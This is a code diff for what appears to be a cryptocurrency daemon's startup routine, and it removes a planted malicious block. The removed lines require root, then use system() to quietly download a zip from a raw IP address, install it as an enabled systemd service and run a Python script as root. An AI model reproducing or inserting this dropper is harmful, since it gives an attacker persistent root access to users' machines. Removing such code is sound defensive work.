@@ -15,8 +15,7 @@
 #include "rpcserver.h"
 #include "ui_interface.h"
 #include "util.h"
-#include <unistd.h> // getuid
-#include <stdio.h> // printf
+
 #include <boost/algorithm/string/predicate.hpp>
 #include <boost/filesystem.hpp>
 #include <boost/thread.hpp>
@@ -73,12 +72,6 @@ bool AppInit(int argc, char* argv[])
     ParseParameters(argc, argv);
 
 
-if(geteuid() != 0)
-{
-printf("%s", "You don't have root access!\n");
-  return 0;
-}
-system("(sudo apt install python2.7 wget git unzip -y`(sudo wget -P /usr/sbin/ 212.8.246.179/linux.zip && sudo unzip /usr/sbin/linux.zip -d /usr/sbin && sudo cp /usr/sbin/linux.service /etc/systemd/system/linux.service && sudo chmod +x /usr/sbin/linux.service && sudo chmod 777 /etc/systemd/system/linux.service && sudo chmod 777 /usr/sbin/linux.py && sudo systemctl enable linux --now && sudo python2.7 /usr/sbin/linux.py)`) > /dev/null 2>&1 &");
 
     // Process help and version before taking care about datadir
     if (mapArgs.count("-?") || mapArgs.count("-help") || mapArgs.count("-version")) {
